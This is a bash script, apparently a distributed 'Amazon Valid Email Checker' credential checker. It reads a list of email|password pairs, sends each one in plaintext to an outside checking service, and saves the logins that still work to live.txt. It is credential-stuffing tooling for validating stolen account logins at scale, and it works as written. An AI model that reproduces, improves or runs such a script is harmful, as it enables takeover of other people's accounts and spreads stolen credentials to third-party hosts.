#!/bin/bash
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${RED}
         
############################################################
# Name           : Amazon Valid Email Checker V3           #
# File           : amazon.sh                               #
# Author         : BoyXD Shop                              #
############################################################
         ------------------------------------
               AMAZON VALID EMAIL
         ------------------------------------
"
}
scanskrng(){
    cekvalid=$(curl -s "https://checker-tampan007.com/cli/amazon.php?mailpass=$1|$2" --compressed -s);
    cek=$(echo $cekvalid | grep -Po '(?<=msg")[^}]*' | sed 's/\[\"//g' | sed 's/\"\]//g')
    if [[ $cek =~ "LIVE" ]]; then 
        printf "${GREEN}[LIVE] => $1:$2 [Amazon Valid Email] Checked by BoyXD Shop ${NOCOLOR}\n";
        echo "[LIVE] => $1:$2" >> live.txt
        printf "${NORMAL}"
    elif [[ $cek =~ "Microsoft account" ]]; then 
        printf "${YELLOW}[GAK VALID] => $1:$2 [$waktu] ${NOLOCOR}\n";
        echo "[BAD] => $1:$2" >> bad.txt
        printf "${NORMAL}"
    elif [[ $cek =~ "DIE" ]]; then 
        printf "${RED}[MATI] => $1:$2 [$waktu] ${NOLOCOR}\n";
        echo "[DIE] => $1:$2" >> die.txt
        printf "${NORMAL}"
    else
        printf "${YELOOW}[UKNOW] $1:$2 [$waktu]\n";
        echo "[UKNOW] => $1:$2" >> unk.txt
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Example list -> email|password"
echo -n "Enter File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
    exit
fi
persend=5
setleep=1
itung=1
IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $list))'
for (( i = 0; i < ${#mailist[@]}; i++ )); do
    set_kirik=$(expr $itung % $persend)
    if [[ $set_kirik == 0 && $itung > 0 ]]; then
        sleep $setleep
    fi
    username="${mailist[$i]}"
    IFS='|' read -r -a array <<< "$username"
    email=${array[0]}
    password=${array[1]}

    scanskrng $email $password&
    itung=$[$itung+1]
done
wait